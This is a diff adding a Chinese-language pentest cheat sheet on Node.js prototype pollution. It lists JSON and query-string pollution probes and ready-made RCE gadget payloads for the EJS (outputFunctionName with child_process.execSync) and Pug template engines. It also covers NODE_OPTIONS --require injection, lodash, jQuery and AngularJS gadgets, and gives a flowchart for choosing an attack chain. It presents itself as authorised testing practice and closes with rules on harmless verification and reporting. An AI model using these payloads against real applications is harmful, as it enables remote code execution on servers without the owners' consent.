@@ -1,0 +1,82 @@
+# 原型污染已知 Gadget 库（Node.js → RCE 面）
+
+> 深化 `prototype-pollution-test.md`：污染点确认后，**gadget 决定你能走多远**——模板引擎属性注入是主力 RCE 面。均为授权测试手法。
+
+## 一、发现污染点（快速确认）
+
+```json
+// 测试载荷（观察回显或行为变化）
+{"__proto__":{"polluted":"yes"}}
+{"constructor":{"prototype":{"polluted":"yes"}}}
+{"__proto__":{"__proto__":{"polluted":"yes"}}}   // 链式
+// URL query 型
+?__proto__[polluted]=yes
+// JSON5/JSONC 解析差异型（宽松解析）
+```
+
+确认：`Object.prototype.polluted` 出现在对象上/响应差异。
+
+## 二、服务端模板引擎 Gadget（RCE 首选）
+
+### EJS（最高成功率）
+| 属性 | payload 思路 | 触发 |
+|------|-------------|------|
+| `outputFunctionName` | `"x;process.mainModule.require('child_process').execSync('CMD');s"` | 任意 `res.render()` |
+| `destructuredLocals` | 数组注入控制变量声明 | `res.render()` |
+| `escapeFunction` | 替换转义函数为恶意代码 | 带 HTML 转义的 render |
+| `client` | `true` 改编译模式 | render 代码路径变化 |
+
+```json
+{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}
+```
+
+### Pug（Jade 后继）
+| 属性 | payload 思路 | 触发 |
+|------|-------------|------|
+| `block` | `{"type":"Text","val":"x]);require('child_process').execSync('CMD');//"}` | `pug.compile()/render()` |
+| `self` | `true` + line 注入 | 模板编译 |
+| `debug`/`compileDebug` | `true` → 源码泄露（信息泄露） | 编译 |
+
+```json
+{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('CMD');//"}}}
+```
+
+### 其他引擎
+| 引擎 | 属性 |
+|------|------|
+| Handlebars | `allowProtoMethodsByDefault` + template 链 |
+| Nunjucks | `type: "Code"` |
+| Jade（老） | `block`/`self` 类 Pug |
+
+## 三、Node.js 核心 / 库级 Gadget
+
+- **child_process + NODE_OPTIONS**：如果 app 用 child_process，`NODE_OPTIONS=--require /tmp/x.js` 环境注入 → 下次子进程启动即执行（通用 Node RCE）
+- **lodash**：`_.defaultsDeep`/`_.merge` 面（合并函数递归污染）；`cloneDeep` 变体
+- **jQuery**（客户端）：`$.extend` + `__proto__` → 客户端 XSS/逻辑污染
+- **AngularJS 1.x**：`Object.prototype` 污染触碰 `$scope` → XSS
+- **Fastify + point-of-view**：同模板 gadget 通过 `reply.view` 触发
+- **CLI 参数污染**：`--polluted=yes` 到解析器 → 覆盖默认配置
+
+## 四、选链流程图（污染点到手后）
+
+```
+污染点确认（__proto__/constructor 生效）
+├─ 服务端 Node.js?
+│   ├─ Express + 模板引擎?
+│   │   ├─ EJS → outputFunctionName（成功率最高）
+│   │   ├─ Pug/Jade → block.type + block.val
+│   │   ├─ Handlebars → allowProtoMethodsByDefault
+│   │   ├─ Nunjucks → type:"Code"
+│   │   └─ 未知 → 先试 EJS gadget（最常见）
+│   ├─ Fastify → 同模板 gadget via reply.view
+│   ├─ 用 child_process? → NODE_OPTIONS 环境注入（通用）
+│   └─ 无模板无 child_process → 找配置覆盖（debug/日志/白名单开关）
+├─ 客户端 JS（Angular/Vue/jQuery）→ XSS/逻辑绕过（低危升级面）
+└─ 仅服务端配置污染（无 RCE 面）→ 信息泄露/功能绕过（中危起）
+```
+
+## 五、纪律
+- 污染探测用无害值（`polluted=yes`），确认后 gadget 才上 RCE payload
+- RCE 验证走无害命令 + DNSLOG（见 `webshell.md` 协议），用完恢复
+- 客户端污染（Angular/Vue）按 XSS 定级流程（admin 盲打才高危）
+- 报告写清：污染入口（JSON 字段/query 参数）→ 解析器（JSON5/merge 函数）→ gadget → 影响
